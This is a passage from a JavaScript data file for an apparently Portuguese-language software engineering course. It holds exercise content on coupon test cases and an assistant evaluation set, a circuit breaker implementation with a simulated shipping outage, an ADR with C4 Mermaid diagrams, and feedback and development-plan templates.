
Critérios de aceite:
- O cupom tem validade e valor mínimo de compra
- Só um cupom por pedido
- O desconto não se aplica ao frete` },
      { nome: "Quem pensou em quê", tabela: {
        colunas: ["Caso de teste", "QA", "IA"],
        linhas: [
          ["Cupom válido aplica o desconto", "Sim", "Sim"],
          ["Cupom vencido é recusado", "Sim", "Sim"],
          ["Compra abaixo do valor mínimo", "Sim", "Sim"],
          ["Segundo cupom substitui ou é recusado", "Sim", "Sim"],
          ["Desconto não incide sobre o frete", "Sim", "Não"],
          ["Cupom em maiúsculas, minúsculas e com espaços", "Não", "Sim"],
          ["Cupom vence entre aplicar e pagar", "Não", "Sim"],
          ["Remover item deixa a compra abaixo do mínimo", "Sim", "Não"],
          ["Cupom de cliente bloqueado por fraude (regra interna)", "Sim", "Não"],
          ["Desconto maior que o valor da compra", "Não", "Sim"]
        ]
      } },
      { nome: "avaliacao.json — para o assistente de dúvidas do produto", codigo: `[
  {
    "pergunta": "Posso usar dois cupons no mesmo pedido?",
    "respostaDeReferencia": "Não. É permitido apenas um cupom por pedido.",
    "criterios": ["Diz claramente que não", "Não inventa exceções"]
  },
  {
    "pergunta": "O cupom dá desconto no frete?",
    "respostaDeReferencia": "Não. O desconto vale só para os produtos.",
    "criterios": ["Diz que o frete não tem desconto"]
  },
  {
    "pergunta": "Qual é o cupom de hoje?",
    "respostaDeReferencia": "O assistente não informa cupons; orienta a consultar as promoções.",
    "criterios": ["Não inventa um código de cupom"]
  }
]` }
    ],
    observar: "A IA cobriu bordas técnicas que o QA esqueceu; o QA cobriu regras do negócio que a IA não tinha como saber. A avaliação é reexecutada a cada mudança de prompt ou de modelo."
  },
  /* 34 — Resiliência */
  {
    intro: "Um disjuntor (circuit breaker) completo protegendo a chamada a um serviço de frete que saiu do ar.",
    blocos: [
      { nome: "disjuntor.js", rodar: true, codigo: `class Disjuntor {
  constructor(acao, { limiteDeFalhas = 3, esperaMs = 1000 } = {}) {
    this.acao = acao;
    this.limiteDeFalhas = limiteDeFalhas;
    this.esperaMs = esperaMs;
    this.falhas = 0;
    this.estado = "fechado";       // fechado -> aberto -> meio-aberto -> fechado
    this.tentarDeNovoEm = 0;
  }

  async chamar(...argumentos) {
    if (this.estado === "aberto") {
      if (Date.now() < this.tentarDeNovoEm) {
        throw new Error("Disjuntor aberto: falha imediata, sem chamar o serviço");
      }
      this.estado = "meio-aberto";  // deixa passar uma chamada de teste
    }

    try {
      const resultado = await this.acao(...argumentos);
      this.falhas = 0;
      this.estado = "fechado";
      return resultado;
    } catch (erro) {
      this.falhas++;
      if (this.estado === "meio-aberto" || this.falhas >= this.limiteDeFalhas) {
        this.estado = "aberto";
        this.tentarDeNovoEm = Date.now() + this.esperaMs;
      }
      throw erro;
    }
  }
}

// Simulação: o serviço de frete está fora do ar e depois volta
let servicoNoAr = false;
let chamadasReais = 0;
async function calcularFrete(cep) {
  chamadasReais++;
  if (!servicoNoAr) throw new Error("Serviço de frete indisponível");
  return { cep, valor: 19.9 };
}

const frete = new Disjuntor(calcularFrete, { limiteDeFalhas: 3, esperaMs: 300 });

// Degradação graciosa: sem frete, o pedido segue com um valor padrão
async function freteOuPadrao(cep) {
  try {
    return await frete.chamar(cep);
  } catch (erro) {
    return { cep, valor: 25, estimado: true, motivo: erro.message };
  }
}

(async () => {
  for (let i = 1; i <= 6; i++) {
    const resposta = await freteOuPadrao("17400-000");
    console.log(i, frete.estado, "-", resposta.motivo);
  }
  console.log("Chamadas reais ao serviço:", chamadasReais);   // 3, não 6

  servicoNoAr = true;
  await new Promise((resolver) => setTimeout(resolver, 350));
  console.log(await freteOuPadrao("17400-000"), frete.estado); // valor real, fechado
})();` },
      { nome: "Análise pós-incidente do exercício", tabela: {
        colunas: ["Item", "Registro"],
        linhas: [
          ["O que aconteceu", "O serviço de frete ficou fora do ar em homologação"],
          ["Impacto sem disjuntor", "Cada pedido esperava o tempo limite inteiro e o checkout travava"],
          ["Impacto com disjuntor", "Depois de três falhas, o checkout respondeu na hora com frete estimado"],
          ["O que funcionou", "A degradação manteve a venda"],
          ["O que melhorar", "Alerta quando o disjuntor abre; aviso ao cliente de que o frete é estimado"],
          ["Ações", "Uma por linha, com responsável e prazo"]
        ]
      } }
    ],
    observar: "Com o disjuntor aberto, o serviço em falha para de ser chamado e ganha tempo para se recuperar. A chamada de teste fecha o circuito sozinha."
  },
  /* 35 — ADRs e C4 */
  {
    intro: "Um ADR preenchido e os dois primeiros níveis do C4 escritos como código, em Mermaid, para versionar junto com o sistema.",
    blocos: [
      { nome: "docs/adr/0012-fila-para-envio-de-notificacoes.md", codigo: `# ADR 0012: Fila para envio de notificações

Data: 2027-03-10
Status: aceita

## Contexto
O envio de e-mail e SMS acontece dentro da requisição de criação de pedido.
Quando o provedor de SMS fica lento, a criação de pedidos também fica.
Tivemos dois incidentes por esse motivo no último trimestre.

## Decisão
A criação de pedido passa a publicar um evento em uma fila.
Um processo separado consome a fila e envia as notificações,
com até cinco tentativas e fila de mensagens mortas.

## Alternativas consideradas
- Aumentar o tempo limite da chamada: esconde o problema, não resolve.
- Trocar de provedor de SMS: não elimina a dependência síncrona.

## Consequências
+ A criação de pedido deixa de depender do provedor de SMS.
+ Notificações podem ser reenviadas em caso de falha.
- A notificação pode chegar com alguns segundos de atraso.
- Passamos a operar e monitorar uma fila.` },
      { nome: "docs/arquitetura/contexto.mmd (C4 nível 1)", codigo: `flowchart TB
  cliente(["Cliente<br/>faz pedidos pelo site e pelo app"])
  atendente(["Atendente<br/>acompanha pedidos"])

  sistema["Sistema de Pedidos<br/>nosso produto"]

  pagamento[["Gateway de Pagamento<br/>externo"]]
  sms[["Provedor de SMS e e-mail<br/>externo"]]

  cliente -->|cria e acompanha pedidos| sistema
  atendente -->|consulta e altera pedidos| sistema
  sistema -->|cobra| pagamento
  sistema -->|envia notificações| sms` },
      { nome: "docs/arquitetura/conteineres.mmd (C4 nível 2)", codigo: `flowchart TB
  web["Aplicação Web<br/>React"]
  app["Aplicativo<br/>Flutter"]
  api["API<br/>Node.js"]
  banco[("Banco de dados<br/>PostgreSQL")]
  fila[["Fila de notificações"]]
  worker["Processador de notificações<br/>Node.js"]
  sms[["Provedor de SMS e e-mail"]]

  web -->|HTTPS e JSON| api
  app -->|HTTPS e JSON| api
  api -->|lê e grava| banco
  api -->|publica evento| fila
  fila --> worker
  worker -->|envia| sms` }
    ],
    observar: "O ADR cabe em uma tela e registra o que foi descartado. O GitLab e o GitHub desenham Mermaid direto no Markdown, então o diagrama é revisado como código."
  },
  /* 36 — Carreira e cultura de aprendizado */
  {
    intro: "Modelos preenchidos para a retrospectiva final: um feedback no formato situação, comportamento e impacto, um plano de desenvolvimento e a linha do tempo.",
    blocos: [
      { nome: "Feedback: antes e depois", tabela: {
        colunas: ["Vago", "Situação, comportamento e impacto"],
        linhas: [
          ["Você precisa se comunicar melhor.", "Na revisão de terça, você apontou o problema na consulta e já trouxe o plano de execução. Isso encurtou a discussão e resolvemos no mesmo dia. Continue trazendo evidências assim."],
          ["Seu código é confuso.", "No merge request do relatório, a função principal tinha 120 linhas e precisei de uma hora para revisar. Dividir em funções menores ajudaria quem revisa. Quer fazer isso em par comigo?"],
          ["Bom trabalho!", "Na apresentação de Docker, você preparou o ambiente antes e a prática funcionou na máquina de todos. Três pessoas me disseram que rodaram o projeto pela primeira vez sem ajuda."]
        ]
      } },
      { nome: "plano-de-desenvolvimento.md", codigo: `# Plano de desenvolvimento — próximos 12 meses

Onde estou:
  Desenvolvo funcionalidades de back-end com autonomia.
  Ainda dependo de outras pessoas para decisões de arquitetura.

Objetivo:
  Conduzir o desenho técnico de uma funcionalidade de ponta a ponta.

Ações:
  1. Escrever o ADR das duas próximas decisões técnicas do meu time   (até junho)
  2. Apresentar um tema no programa de Tech Talks                    (segundo semestre)
  3. Fazer mentoria quinzenal com uma pessoa sênior                  (a partir de março)

Como saberei que cheguei lá:
  Um desenho técnico meu foi aprovado e implementado sem retrabalho relevante.

Apoio de que preciso:
  Participar das revisões de arquitetura e ter duas horas por semana para estudo.` },
      { nome: "Linha do tempo dos encontros", tabela: {
        colunas: ["Encontro", "O que mudou no nosso trabalho", "Ainda fazemos?"],
        linhas: [
          ["Código Limpo", "Guia de estilo e convenção de nomes", "Preencher"],
          ["Testes e TDD", "Testes unitários obrigatórios em código novo", "Preencher"],
          ["CI/CD", "Publicação em homologação a cada merge", "Preencher"],
          ["Arquitetura Limpa", "Casos de uso isolados no módulo novo", "Preencher"],
          ["Observabilidade", "Logs estruturados e primeiro SLO", "Preencher"]
        ]
      } }
    ],
    observar: "O bom feedback descreve um fato observável e o efeito dele. O plano tem poucas ações, com prazo e um critério claro de chegada."
  }
];
